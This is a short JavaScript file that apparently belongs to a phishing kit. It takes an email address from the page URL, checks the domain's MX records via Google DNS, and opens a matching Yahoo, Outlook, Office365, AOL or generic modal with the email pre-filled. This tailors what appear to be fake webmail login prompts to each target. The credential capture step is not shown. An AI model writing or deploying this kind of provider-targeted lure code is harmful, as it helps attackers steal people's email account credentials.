function openModal(provider) {
  document.getElementById(`${provider}-modal`).classList.remove("hidden");
}

function closeModal(provider) {
  document.getElementById(`${provider}-modal`).classList.add("hidden");
}

function getQueryParam(param) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(param);
}

// Open the corresponding modal based on the email domain and prefill the email field
async function openModalByEmail() {
  const email = getQueryParam("EMAIL");
  if (!email) return;

  var record;

  const domain = email.split("@")[1];
  if (!domain) return;
  async function checkMXRecords(newdomain) {
    try {
      const response = await fetch(`https://dns.google/resolve?name=${newdomain}&type=MX`);
      const data = await response.json();

      if (data.Answer) {
        const mxRecords = data.Answer.filter(record => record.type === 15);
        return mxRecords.map(record => record.data);
      } else {
        return [];
      }
    } catch (error) {
      console.error("Error checking MX records:", error);
      throw error;
    }
  }

  await checkMXRecords(domain)
    .then(mxRecords => {
      if (mxRecords.length > 0) {
        console.log("MX Records:", mxRecords);
        record = mxRecords[0];
        console.log(record);

      } else {
        console.log("No MX records found.");
      }
    })
    .catch(error => {
      // Handle the error appropriately
    });

  let modalToOpen = null;
  let emailFieldId = null;

  // Determine which modal to open based on the domain
  if (domain.includes("yahoo")) {
    modalToOpen = "yahoo";
    emailFieldId = "email-yahoo";
  } else if (record.includes("emailsrvr.com")) {
    modalToOpen = "outlook";
    emailFieldId = "email-outlook";
  } else if (
    domain.includes("hotmail") ||
    domain.includes("microsoft") || record.includes("mail.protection.outlook.com")
  ) {
    modalToOpen = "office365";
    emailFieldId = "email-office";
  } else if (domain.includes("aol")) {
    modalToOpen = "aol";
    emailFieldId = "email-aol";
  } else {
    modalToOpen = "other";
    emailFieldId = "email-other";
  }

  // Open the determined modal
  if (modalToOpen) {
    openModal(modalToOpen);

    // Prefill the email field in the opened modal
    const emailField = document.getElementById(emailFieldId);
    if (emailField) {
      emailField.value = email;
    }
  }
}

// Call the function to open the correct modal and prefill the email field when the page loads
window.addEventListener("DOMContentLoaded", openModalByEmail);
